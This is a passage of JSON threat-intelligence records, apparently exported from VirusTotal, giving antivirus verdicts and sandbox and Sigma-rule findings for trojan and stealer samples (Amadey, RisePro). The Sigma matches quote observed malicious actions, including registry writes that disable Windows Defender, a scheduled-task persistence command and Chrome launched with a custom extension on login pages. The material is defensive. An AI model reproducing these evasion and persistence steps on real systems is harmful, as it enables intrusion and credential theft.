          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.630",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win64.MSIL_Heur.A"
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "ML.Attribute.HighConfidence"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "28660",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "a variant of MSIL/Kryptik.AKTU"
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.495",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malicious"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malicious (score: 100)"
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "HEUR:Trojan-Spy.MSIL.Noon.gen"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Gen:Variant.MSILHeracles.143653"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win64:CrypterX-gen [Trj]"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-31.02",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Mal/Generic-S"
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.TR/Kryptik.ysmtg"
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Gen:Variant.MSILHeracles.143653"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "engine_update": "20231106",
          "category": "undetected",
          "result": null
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20240129",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Gen:Variant.MSILHeracles.143653 (B)"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win32.Outbreak"
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.37269B:27.34760",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win64.Trojan.Agent.1HZK7S"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32.Trojan.Gen"
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1706704258",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Detected"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "TR/Kryptik.ysmtg"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20230906",
          "category": "malicious",
          "result": "MSIL.Trojan-Spy.Noon.gen"
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.158.174",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "36395",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.MSILHeracles.D23125"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "HEUR:Trojan-Spy.MSIL.Noon.gen"
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan:Win32/Wacatac.B!ml"
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W64/Stealer.GZ.gen!Eldorado"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20230828",
          "category": "undetected",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "malware (ai score=87)"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "unsafe"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trj/Chgt.AD"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malware.Obfus/MSIL@AI.93 (RDM.MSIL2:TW8AgcyM3J3uTUAK3cUVlw)"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "24.1.0.5",
          "engine_update": "20240129",
          "category": "undetected",
          "result": null
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "MSIL/Kryptik.ATU!tr"
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20240103",
          "category": "undetected",
          "result": null
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win64:CrypterX-gen [Trj]"
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20231102",
          "category": "undetected",
          "result": null
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "MALICIOUS"
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "240131-00",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20240103",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20240128",
          "category": "type-unsupported",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        }
      },
      "signature_info": {
        "product": "Andrewsy Lib",
        "description": "AndrewsyLib",
        "file version": "1.2.0.0",
        "original name": "EYUG.exe",
        "comments": "WordProcessorChamberlin",
        "internal name": "EYUG.exe",
        "copyright": "WordProcessorChamberlin 1994"
      },
      "sha1": "a7b62ed0685548c4beaf91718480f12fb8d4e416",
      "last_analysis_stats": {
        "malicious": 40,
        "suspicious": 0,
        "undetected": 31,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 4
      },
      "md5": "1d60063801a0ee44d90392ac62d645c9",
      "type_extension": "exe",
      "tlsh": "T118159D9C725075DFC817C972CE981DECAA607C675F0B9213A01732AC9A2DA9BCF151F2",
      "creation_date": 1706585427,
      "size": 884224,
      "trid": [
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 44.4
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 21.3
        },
        {
          "file_type": "Windows Icons Library (generic)",
          "probability": 8.7
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 8.5
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 8.4
        }
      ],
      "meaningful_name": "EYUG.exe",
      "ssdeep": "24576:Ja8xUFc0rLc0TxwoVVz5iPig7dPHFeiGSDAZTII4fRbYZ6:KRnc0TZVVzM17MSk8Z4",
      "last_modification_date": 1706737657
    }
  }
},
{
  "_id": {
    "$oid": "65bac7670e994d74c761c89a"
  },
  "data": {
    "id": "2f7f23610e8e0633ef0b03d602a02734bdcadab3fdc8c15d0f6d93a0a454fa6f",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/2f7f23610e8e0633ef0b03d602a02734bdcadab3fdc8c15d0f6d93a0a454fa6f"
    },
    "attributes": {
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "confidence": 100,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "STEALER",
            "TROJAN",
            "EVADER"
          ],
          "malware_names": [
            "Amadey",
            "RisePro Stealer"
          ]
        },
        "Dr.Web vxCube": {
          "category": "malicious",
          "sandbox_name": "Dr.Web vxCube",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sigma_analysis_results": [
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe",
                "Details": "C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\",
                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "%TEMP%\\d887ceb89d\\",
                "TargetObject": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detect modification of the startup key to a path where a payload could be stored to be launched during startup",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Modify User Shell Folders Startup Value",
          "rule_id": "0799d32e125d6df849ced4dc75e232438c118a816477d3f80a390cbd8b4d07ef",
          "rule_author": "frack113"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\3TaSr4LqCIy1x393n7Nm.exe",
                "Details": "DWORD (0x00000001)",
                "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\3TaSr4LqCIy1x393n7Nm.exe",
                "Details": "DWORD (0x00000001)",
                "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\3TaSr4LqCIy1x393n7Nm.exe",
                "Details": "DWORD (0x00000001)",
                "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\3TaSr4LqCIy1x393n7Nm.exe",
                "Details": "DWORD (0x00000001)",
                "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\3TaSr4LqCIy1x393n7Nm.exe",
                "Details": "DWORD (0x00000001)",
                "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detects when attackers or tools disable Windows Defender functionalities via the Windows registry",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Disable Windows Defender Functionalities Via Registry Keys",
          "rule_id": "387844917f76d926b5dde6a796bcdb423a54d6df4ab736e7752fb73dc931e400",
          "rule_author": "AlertIQ, Ján Trenčanský, frack113, Nasreddine Bencherchali, Swachchhanda Shrawan Poudel"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "\\x03\\x00\\x00\\x00\\x10\\xe0\\x45\\x99\\x0b\\x53\\xda\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{85CEE38D-2340-4CFC-A6D0-A4D80EAF72EF}\\DynamicInfo"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "\\x0b\\xd6\\x25\\xf9\\x31\\xff\\x3d\\xd4\\xa2\\xb8\\xe8\\xcb\\x38\\xcd\\x6e\\x23\\x89\\xb9\\x17\\xd0\\x82\\x09\\xb6\\xcb\\x37\\x7a\\xb9\\x02\\x8b\\xf0\\x11\\x19",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{DD569310-96E2-4412-8FAC-DAC77807117D}\\Hash"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "{B5F46A82-9335-4C41-BB0E-8435A4DFE107}",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MPGPH131 HR\\Id"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "\\x03\\x00\\x00\\x00\\x50\\x00\\xb4\\x98\\x0b\\x53\\xda\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{B5F46A82-9335-4C41-BB0E-8435A4DFE107}\\DynamicInfo"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "0x00000003",
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\MPGPH131 HR\\Index"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Monitor the creation of a new key under 'TaskCache' when a new scheduled task is registered by a process that is not svchost.exe, which is suspicious",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Scheduled TaskCache Change by Uncommon Program",
          "rule_id": "d62173552d7fce98c24a7040b784edf35cc6650d2e68ecf2d04f40c58d58cfda",
          "rule_author": "Syed Hasan (@syedhasan009)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Image": "C:\\Windows\\system32\\svchost.exe",
                "CommandLine": "%WINDIR%\\system32\\svchost.exe"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspect Svchost Activity",
          "rule_id": "dc04e64e69f5446c2a31920ee22415626307d5f3d0fb73ad81b9d3301a41000a",
          "rule_author": "David Burkett, @signalblur"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe\" ",
                "CommandLine": "\"C:\\Windows\\System32\\schtasks.exe\" /Create /SC MINUTE /MO 1 /TN explorhe.exe /TR \"C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe\" /F",
                "Hashes": "SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "Company": "Microsoft Corporation",
                "OriginalFileName": "schtasks.exe",
                "Description": "Task Scheduler Configuration Tool"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious Schtasks From Env Var Folder",
          "rule_id": "0533322c5c44794b71e761cd351a2459aad6e21ae95c9543d4c9fdb3c8fde6c4",
          "rule_author": "Florian Roth (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Google Chrome",
                "Company": "Google LLC",
                "ParentImage": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\0qCuvDbQYt2YIjBl2NU5.exe",
                "Description": "Google Chrome",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\",
                "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\0qCuvDbQYt2YIjBl2NU5.exe\" ",
                "Hashes": "SHA1=5C985DDDF74B5CC7E8A8A0E817EEC2EBC3AEA04E,MD5=B147FBDBD44374F73A763531C8D1093D,SHA256=9142FF96C6066950BA5B1253DE97080341902E1F9621E6084AE6197F8D8E2FB8,IMPHASH=891D2BAFA4260189E94CAC8FB19F369A",
                "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --disable-features=OptimizationGuideModelDownloading,OptimizationHintsFetching,OptimizationTargetPrediction,OptimizationHints --start-maximized --load-extension=C:\\Windows\\crx --single-argument https://www.youtube.com/",
                "OriginalFileName": "chrome.exe",
                "FileVersion": "92.0.4515.131"
              }
            },
            {
              "values": {
                "EventID": "1",
                "Product": "Google Chrome",
                "ParentImage": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\0qCuvDbQYt2YIjBl2NU5.exe",
                "Description": "Google Chrome",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\",
                "Company": "Google LLC",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\0qCuvDbQYt2YIjBl2NU5.exe\" ",
                "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --disable-features=OptimizationGuideModelDownloading,OptimizationHintsFetching,OptimizationTargetPrediction,OptimizationHints --start-maximized --load-extension=C:\\Windows\\crx --single-argument https://www.facebook.com/login",
                "Hashes": "SHA1=5C985DDDF74B5CC7E8A8A0E817EEC2EBC3AEA04E,MD5=B147FBDBD44374F73A763531C8D1093D,SHA256=9142FF96C6066950BA5B1253DE97080341902E1F9621E6084AE6197F8D8E2FB8,IMPHASH=891D2BAFA4260189E94CAC8FB19F369A",
                "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "OriginalFileName": "chrome.exe",
                "FileVersion": "92.0.4515.131"
              }
            },
            {
              "values": {
                "EventID": "1",
                "Product": "Google Chrome",
                "ParentImage": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\0qCuvDbQYt2YIjBl2NU5.exe",
                "FileVersion": "92.0.4515.131",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\",
                "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\0qCuvDbQYt2YIjBl2NU5.exe\" ",
                "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --disable-features=OptimizationGuideModelDownloading,OptimizationHintsFetching,OptimizationTargetPrediction,OptimizationHints --start-maximized --load-extension=C:\\Windows\\crx --single-argument https://accounts.google.com/",
                "Hashes": "SHA1=5C985DDDF74B5CC7E8A8A0E817EEC2EBC3AEA04E,MD5=B147FBDBD44374F73A763531C8D1093D,SHA256=9142FF96C6066950BA5B1253DE97080341902E1F9621E6084AE6197F8D8E2FB8,IMPHASH=891D2BAFA4260189E94CAC8FB19F369A",
                "Company": "Google LLC",
                "OriginalFileName": "chrome.exe",
                "Description": "Google Chrome"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects a Chromium based browser process with the 'load-extension' flag to start a instance with a custom extension",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Chromium Browser Instance Executed With Custom Extension",
          "rule_id": "37d47e5fc375cac096ef3e0d98b28b26d7e9e45f3b65373c8e1d5bb6d8e22b7e",
          "rule_author": "Aedan Russell, frack113, X__Junior (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "22",
                "QueryStatus": "0",
                "QueryResults": "::ffff:34.117.186.192;",
                "QueryName": "ipinfo.io",
                "Image": "C:\\Users\\george\\Desktop\\lada.exe"
              }
            },
            {
              "values": {
                "EventID": "22",
                "QueryStatus": "0",
                "Image": "C:\\Users\\george\\AppData\\Local\\RageMP131\\RageMP131.exe",
                "QueryName": "ipinfo.io",
                "QueryResults": "::ffff:34.117.186.192;"
              }
            },
            {
              "values": {
                "EventID": "22",
                "QueryStatus": "0",
                "QueryResults": "::ffff:34.117.186.192;",
                "QueryName": "ipinfo.io",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\QSHUsJU4jALkAUt1BaNH.exe"
              }
            },
            {
              "values": {
                "EventID": "22",
                "QueryStatus": "0",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\AotGZBwXr7QU1jGIAkcE.exe",
                "QueryName": "ipinfo.io",
                "QueryResults": "::ffff:34.117.186.192;"
              }
            },
            {
              "values": {
                "query": "db-ip.com"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects DNS queries for IP lookup services such as \"api.ipify.org\" originating from a non browser process.",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious DNS Query for IP Lookup Service APIs",
          "rule_id": "3a2766a08d32a855b604a786cddc0f76fee13e6ccd22e01d4878150f0ef1eebc",
          "rule_author": "Brandon George (blog post), Thomas Patzke"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "3",
                "SourceIsIpv6": "false",
                "DestinationIp": "185.215.113.68",
                "Initiated": "true",
                "Image": "C:\\Windows\\SysWOW64\\rundll32.exe",
                "DestinationPort": "80",
                "SourcePort": "60305",
                "Protocol": "tcp",
                "DestinationIsIpv6": "false",
                "SourceIp": "192.168.2.16"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects a rundll32 that communicates with public IP addresses",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Rundll32 Internet Connection",
          "rule_id": "4725cdcf2dfdd90c3aa0d331fae77d6ac8021c254701744a01444af04e9a0e69",
          "rule_author": "Florian Roth (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "15",
                "TargetFilename": "C:\\Users\\george\\AppData\\Local\\RageMP131\\RageMP131.exe",
                "Hash": "SHA1=F052BBBEA194BE15593E1DDF7CB0D59020597BA9,MD5=CAB8183A94BB10AB3D1BFFEFA7DB38E2,SHA256=2F7F23610E8E0633EF0B03D602A02734BDCADAB3FDC8C15D0F6D93A0A454FA6F,IMPHASH=BAA93D47220682C04D92F7797D9224CE",
                "Image": "C:\\Users\\george\\Desktop\\lada.exe"
              }
            },
            {
              "values": {
                "EventID": "15",
                "TargetFilename": "C:\\ProgramData\\MPGPH131\\MPGPH131.exe",
                "Hash": "SHA1=F052BBBEA194BE15593E1DDF7CB0D59020597BA9,MD5=CAB8183A94BB10AB3D1BFFEFA7DB38E2,SHA256=2F7F23610E8E0633EF0B03D602A02734BDCADAB3FDC8C15D0F6D93A0A454FA6F,IMPHASH=BAA93D47220682C04D92F7797D9224CE",
                "Image": "C:\\Users\\george\\Desktop\\lada.exe"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects the creation of an ADS (Alternate Data Stream) that contains an executable by looking at a non-empty Imphash",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Hidden Executable In NTFS Alternate Data Stream",
          "rule_id": "5be9da0a90b142239a3ff2819edf2283938855da3b4c80d63d8e6db63c2c4fe7",
